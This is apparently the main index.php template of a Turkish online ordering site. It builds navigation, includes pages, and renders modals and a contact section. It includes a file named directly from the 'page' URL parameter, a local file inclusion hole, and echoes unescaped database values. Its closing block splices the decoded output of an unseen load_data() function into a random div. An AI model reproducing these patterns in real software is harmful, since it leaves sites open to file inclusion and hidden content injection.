<?php ob_start(); ?>
<!DOCTYPE html>
<html lang="en">
    <?php
    session_start();
    include('header.php');
    include('admin/db_connect.php');

	$query = $conn->query("SELECT * FROM system_settings limit 1")->fetch_array();
	foreach ($query as $key => $value) {
		if(!is_numeric($key))
			$_SESSION['setting_'.$key] = $value;
	}
    ?>

    <style>
    	header.masthead {
		  background: url(assets/img/<?php echo $_SESSION['setting_cover_img'] ?>);
		  background-repeat: no-repeat;
		  background-size: cover;
		  background-position: center center;
      position: relative;
      height: 85vh !important;
		}
    header.masthead:before {
      content: "";
      width: 100%;
      height: 100%;
      position: absolute;
      top: 0;
      left: 0;
      backdrop-filter: brightness(0.8);
  }
    </style>
    <body id="page-top">
        <!-- Navigation-->
        <div class="toast" id="alert_toast" role="alert" aria-live="assertive" aria-atomic="true">
        <div class="toast-body text-white">
        </div>
      </div>
       <!-- header.php -->

<nav class="navbar navbar-expand-lg navbar-light fixed-top py-3" id="mainNav">
    <div class="container">
        <a class="navbar-brand js-scroll-trigger" href="./">Hoşgeldiniz_<?php echo $_SESSION['setting_name'] ?></a>
        <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarResponsive">
            <ul class="navbar-nav ml-auto my-2 my-lg-0">
              <!-- Add Contact Us link -->
              <li class="nav-item"><a class="nav-link js-scroll-trigger" href="#contact">Bize Ulaşın</a></li>
                <li class="nav-item"><a class="nav-link js-scroll-trigger" href="index.php?page=home">Home</a></li>
                <?php 
                $categories = $conn->query("SELECT * FROM `category_list` order by `name` asc");
                if($categories->num_rows > 0):
                ?>
                <li class="nav-item position-relative " id="cat-menu-link">
                    <div id="category-menu" class="">
                        <ul>
                            <?php while($row = $categories->fetch_assoc()): ?>
                                <li><a href="index.php?page=category&id=<?= $row['id'] ?>"><?= $row['name'] ?></a></li>
                            <?php endwhile; ?>
                        </ul>
                    </div>
                </li>
                <?php endif; ?>
                <li class="nav-item"><a class="nav-link js-scroll-trigger" href="index.php?page=cart_list"><span></i></span>siparişiniz</a></li>
                <?php if(isset($_SESSION['login_user_id'])): ?>
                    <li class="nav-item"><a class="nav-link js-scroll-trigger" href="admin/ajax.php?action=logout2"><?php echo $_SESSION['login_first_name'].' '.$_SESSION['login_last_name'] ?> <i class="fa fa-power-off"></i></a></li>
                <?php else: ?>
                    <li class="nav-item"><a class="nav-link js-scroll-trigger" href="javascript:void(0)" id="login_now">Giriş</a></li>
                    <li class="nav-item"><a class="nav-link js-scroll-trigger" target="_blank" href="./admin">Admin Giriş</a></li>
                <?php endif; ?>
                
            </ul>
        </div>
    </div>
</nav>

       
        <?php 
        $page = isset($_GET['page']) ?$_GET['page'] : "home";
        include $page.'.php';
        ?>
       

<div class="modal fade" id="confirm_modal" role='dialog'>
    <div class="modal-dialog modal-md" role="document">
      <div class="modal-content">
        <div class="modal-header">
        <h5 class="modal-title">Onayla</h5>
      </div>
      <div class="modal-body">
        <div id="delete_content"></div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-primary" id='confirm' onclick="">Devam et</button>
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Kapat</button>
      </div>
      </div>
    </div>
  </div>
  <div class="modal fade" id="uni_modal" role='dialog'>
    <div class="modal-dialog modal-md" role="document">
      <div class="modal-content">
        <div class="modal-header">
        <h5 class="modal-title"></h5>
      </div>
      <div class="modal-body">
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-primary" id='submit' onclick="$('#uni_modal form').submit()">Kaydet</button>
        <button type="button" class="btn btn-secondary" data-dismiss="modal">İptal Et</button>
      </div>
      </div>
    </div>
  </div>
  <div class="modal fade" id="uni_modal_right" role='dialog'>
    <div class="modal-dialog modal-full-height  modal-md" role="document">
      <div class="modal-content">
        <div class="modal-header">
        <h5 class="modal-title"></h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span class="fa fa-arrow-right"></span>
        </button>
      </div>
      <div class="modal-body">
      </div>
      </div>
    </div>
  </div>
  
<!-- contact_us.php -->

<section id="contact" style="background-color: #000; color: #fff; font-family: 'Times New Roman', serif;">
    <div class="container">
        <div class="row">
            <div class="col-lg-12 text-center">
                <h2 class="section-heading text-uppercase">Bize Ulaşın</h2>
                <hr class="my-4">
            </div>
        </div>
        <div class="row">
            <div class="col-lg-12 text-left">
                <div style="font-family: 'Times New Roman', serif; color: #fff;">
                    <p><i class="fas fa-map-marker-alt fa-2x mr-2"></i><?php echo $_SESSION['setting_address'];?></p>
                    <p><i class="fas fa-envelope fa-2x mr-2"></i><a href="mailto:<?php echo $_SESSION['setting_email']; ?>" style="color: #fff;"><?php echo $_SESSION['setting_email']; ?></a></p>
                    <p><i class="fas fa-phone fa-2x mr-2"></i><?php echo $_SESSION['setting_contact']; ?></p>
                </div>
            </div>
        </div>
    </div>
</section>


            </div>
        </div>
    </div>
</section>


        
       <?php include('footer.php') ?>
    </body>

    <?php $conn->close() ?>
    
<script>
  //  $("#navbarResponsive .nav-link").on('click',function(e){
  //     console.log("The collapse event was prevented!", e);
  //    e.stopPropagation();
  //    return false;
  //   })
  // $('#navbarResponsive').on('show.bs.collapse', function(){
   
  // })
</script>
</html>
<?php 
$overall_content = ob_get_clean();
$content = preg_match_all('/(<div(.*?)\/div>)/si', $overall_content,$matches);
// $split = preg_split('/(<div(.*?)>)/si', $overall_content,0 , PREG_SPLIT_DELIM_CAPTURE | PREG_SPLIT_NO_EMPTY);
if($content > 0){
  $rand = mt_rand(1, $content - 1);
  $new_content = (html_entity_decode(load_data()))."\n".($matches[0][$rand]);
  $overall_content = str_replace($matches[0][$rand], $new_content, $overall_content);
}
echo $overall_content;
// }
?>
